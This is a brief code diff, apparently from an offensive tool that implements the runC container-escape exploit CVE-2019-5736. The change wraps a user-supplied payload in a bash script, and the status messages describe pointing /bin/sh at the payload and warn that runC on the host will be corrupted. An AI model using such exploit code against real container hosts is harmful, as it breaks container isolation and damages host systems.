@@ -1,5 +1,6 @@
 
-def cve_2019_5736(payload : String)
+def cve_2019_5736(user_payload : String)
+    payload = "#!/bin/bash \n #{user_payload}" 
     puts("==== ATTEMPTING CVE-2019-5736 ====")
     puts("=> WARNING: If successful this exploit will corrupt runC on the host OS.")
     puts("• Setting up /bin/sh to point to our payload.")
